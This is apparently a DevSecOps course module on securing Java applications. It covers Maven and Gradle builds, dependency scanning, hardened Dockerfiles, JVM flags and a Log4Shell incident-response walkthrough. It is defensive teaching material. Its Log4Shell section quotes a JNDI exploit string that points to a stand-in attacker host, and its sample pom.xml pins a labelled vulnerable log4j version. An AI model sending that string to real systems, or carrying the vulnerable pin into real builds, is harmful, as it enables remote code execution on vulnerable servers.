# Phase 5 — Java Foundations for DevSecOps

---

## Why DevSecOps Engineers Need Java Knowledge

You won't write Java daily as a DevSecOps engineer, but you MUST understand it because:

1. **70%+ of enterprise applications run on Java** (banks, healthcare, government)
2. **Log4Shell (CVE-2021-44228)** — the worst vulnerability in a decade was in a Java library
3. **Build systems (Maven/Gradle)** — you need to scan and secure them
4. **Spring Boot** — the most common Java web framework, frequent CVE target
5. **JVM monitoring** — you'll need to understand heap dumps, GC, thread analysis

**Your role:** You don't build Java apps. You secure them, scan them, and ensure
they deploy safely.

---

## JVM Basics — What You Need to Know

```
Source Code (.java)
       ↓ (javac compiler)
Bytecode (.class files)
       ↓ (packaged into)
JAR/WAR file (like a zip of compiled code)
       ↓ (runs on)
JVM (Java Virtual Machine)
```

### Key concepts:
- **JAR** — Java Archive. A package of compiled Java code. Like a .exe but portable.
- **WAR** — Web Application Archive. A JAR specifically for web apps.
- **JVM** — The runtime that executes Java. Manages memory, threads, security.
- **Classpath** — Where Java looks for libraries. Security risk if manipulated.
- **Dependencies** — External libraries your app uses (this is where vulnerabilities hide).

### Security implications:
- **Deserialization attacks** — Java objects can be weaponized when deserialized
- **Dependency confusion** — Malicious packages with similar names to legitimate ones
- **Classpath injection** — Attacker adds malicious code to the classpath
- **JMX exposure** — Java Management Extensions can give remote code execution if exposed

---

## Maven — The Build System

Maven is the most common Java build tool. It uses `pom.xml` to define:
- Project metadata
- Dependencies (libraries)
- Build plugins
- Profiles (dev, staging, prod)

### pom.xml structure:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project>
    <modelVersion>4.0.0</modelVersion>
    
    <groupId>com.company</groupId>      <!-- Organization -->
    <artifactId>my-app</artifactId>     <!-- Project name -->
    <version>1.0.0</version>            <!-- Version -->
    <packaging>jar</packaging>          <!-- Output type -->
    
    <!-- DEPENDENCIES — This is where vulnerabilities live! -->
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>3.2.0</version>
        </dependency>
        
        <!-- DANGEROUS: Old version with known CVEs -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.1</version>  <!-- LOG4SHELL VULNERABLE! -->
        </dependency>
    </dependencies>
    
    <!-- BUILD PLUGINS — Security scanning goes here -->
    <build>
        <plugins>
            <!-- OWASP Dependency Check plugin -->
            <plugin>
                <groupId>org.owasp</groupId>
                <artifactId>dependency-check-maven</artifactId>
                <version>9.0.0</version>
                <configuration>
                    <failBuildOnCVSS>7</failBuildOnCVSS>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```

### Essential Maven commands for DevSecOps:
```bash
# Build the project
mvn clean package

# Run tests
mvn test

# Check dependencies for vulnerabilities
mvn org.owasp:dependency-check-maven:check

# Show dependency tree (find transitive dependencies)
mvn dependency:tree

# Check for newer versions of dependencies
mvn versions:display-dependency-updates
```

---

## Gradle — The Modern Build System

Gradle is faster than Maven and uses Groovy/Kotlin DSL instead of XML.
Used by Android, Spring Boot, and many modern Java projects.

### build.gradle structure:
```groovy
plugins {
    id 'java'
    id 'org.springframework.boot' version '3.2.0'
    id 'org.owasp.dependencycheck' version '9.0.0'  // Security scanning!
}

group = 'com.company'
version = '1.0.0'

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web:3.2.0'
    
    // SECURITY: Pin exact versions, never use dynamic versions like '+'
    implementation 'com.fasterxml.jackson.core:jackson-databind:2.16.0'
    
    testImplementation 'org.springframework.boot:spring-boot-starter-test:3.2.0'
}

// Security: Fail build if critical vulnerabilities found
dependencyCheck {
    failBuildOnCVSS = 7.0
    formats = ['HTML', 'JSON']
}
```

### Essential Gradle commands:
```bash
# Build
./gradlew build

# Run dependency vulnerability check
./gradlew dependencyCheckAnalyze

# Show dependency tree
./gradlew dependencies

# Check for updates
./gradlew dependencyUpdates
```

---

## How DevSecOps Engineers Secure Java Apps

### 1. Dependency Scanning (Most Critical)
```bash
# Using OWASP Dependency Check
mvn org.owasp:dependency-check-maven:check

# Using Snyk
snyk test --all-projects

# Using Trivy on the JAR
trivy fs --scanners vuln ./target/my-app.jar
```

### 2. Static Analysis (SAST)
```bash
# SonarQube scan
mvn sonar:sonar \
    -Dsonar.host.url=http://sonarqube:9000 \
    -Dsonar.token=your-token

# SpotBugs (finds security bugs)
mvn com.github.spotbugs:spotbugs-maven-plugin:check

# Semgrep (pattern-based scanning)
semgrep --config=p/java .
```

### 3. Container Security for Java Apps
```dockerfile
# SECURE Dockerfile for Java
# Multi-stage build — keeps image small and secure

# Stage 1: Build
FROM maven:3.9-eclipse-temurin-21 AS builder
WORKDIR /app
COPY pom.xml .
RUN mvn dependency:go-offline  # Cache dependencies
COPY src ./src
RUN mvn clean package -DskipTests

# Stage 2: Run (minimal image)
FROM eclipse-temurin:21-jre-alpine
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
WORKDIR /app
COPY --from=builder /app/target/*.jar app.jar

# Security: Run as non-root
USER appuser

# Security: Set JVM security flags
ENV JAVA_OPTS="-XX:+UseContainerSupport \
    -Djava.security.egd=file:/dev/./urandom \
    -Dcom.sun.management.jmxremote=false"

EXPOSE 8080
ENTRYPOINT ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]
```

### 4. Runtime Security
```bash
# JVM security flags for production
java \
    -Djava.security.manager \           # Enable security manager
    -Dcom.sun.management.jmxremote=false \  # Disable JMX (RCE risk)
    -Djava.rmi.server.hostname=localhost \   # Restrict RMI
    -XX:+UseContainerSupport \              # Respect container limits
    -jar app.jar
```

---

## The Log4Shell Story — Why This Matters

In December 2021, a vulnerability in Log4j (a Java logging library) allowed
attackers to execute arbitrary code on any server running a vulnerable version.

**Impact:**
- Affected virtually every Java application on Earth
- Trivial to exploit: just send `${jndi:ldap://evil.com/payload}` in any input
- Gave attackers full remote code execution

**What DevSecOps engineers did:**
1. Ran `mvn dependency:tree | grep log4j` across all repos
2. Scanned all container images for vulnerable versions
3. Deployed WAF rules to block JNDI strings
4. Patched thousands of applications in 48 hours
5. Added permanent scanning to prevent recurrence

**Lesson:** A single transitive dependency (a dependency of a dependency)
can compromise your entire infrastructure. This is why dependency scanning
is non-negotiable.

---

## Memory Technique: "JAR → SCAN → BUILD → SHIP"

For every Java application:
1. **JAR** — Understand what's in it (`mvn dependency:tree`)
2. **SCAN** — Check for vulnerabilities (OWASP, Snyk, Trivy)
3. **BUILD** — Secure Dockerfile (multi-stage, non-root, minimal base)
4. **SHIP** — Deploy with security flags (no JMX, security manager)

---

## Common Mistakes

1. **Using `latest` Spring Boot without checking CVEs** — Pin versions
2. **Not scanning transitive dependencies** — They're 80% of your attack surface
3. **Running Java containers as root** — Always use non-root user
4. **Exposing JMX/RMI ports** — Instant remote code execution
5. **Using Java serialization** — Deserialization attacks are devastating
6. **Not setting memory limits** — JVM will consume all available memory

---

## Interview Insight

**Q: "How would you respond to a Log4Shell-type zero-day?"**

"My response would follow this timeline:

**Hour 0-1 (Detection & Assessment):**
- Identify all affected systems using dependency scanning across all repos
- Query container registry for images containing vulnerable library
- Assess exposure: which services are internet-facing?

**Hour 1-4 (Immediate Mitigation):**
- Deploy WAF rules to block exploit strings
- Set JVM flag `-Dlog4j2.formatMsgNoLookups=true` as temporary fix
- Isolate highest-risk services (internet-facing + sensitive data)

**Hour 4-24 (Patching):**
- Update dependency version in all affected projects
- Rebuild and redeploy container images
- Verify fix with targeted testing

**Hour 24-72 (Verification & Hardening):**
- Scan all systems to confirm no vulnerable versions remain
- Review logs for exploitation attempts during exposure window
- Add permanent detection rules to SIEM
- Update dependency scanning policies to catch similar issues

**Post-incident:**
- Retrospective: Why didn't we catch this sooner?
- Improve: Add SBOM (Software Bill of Materials) generation
- Automate: Create alerts for any new critical CVE in our dependency tree"
